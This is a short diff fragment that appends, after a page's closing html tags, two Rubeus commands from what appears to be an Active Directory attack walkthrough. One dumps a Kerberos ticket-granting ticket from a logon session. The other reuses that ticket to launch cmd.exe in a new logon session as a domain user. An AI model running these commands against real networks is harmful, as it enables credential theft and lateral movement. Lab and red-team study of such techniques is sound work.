@@ -41,3 +41,9 @@
   </code>
 </body>
 </html>
+
+We can simply extract this TGT snd leverage it via a new logon session.
+Rubeus.exe dump /luid:0x14794e /nowrap
+
+
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
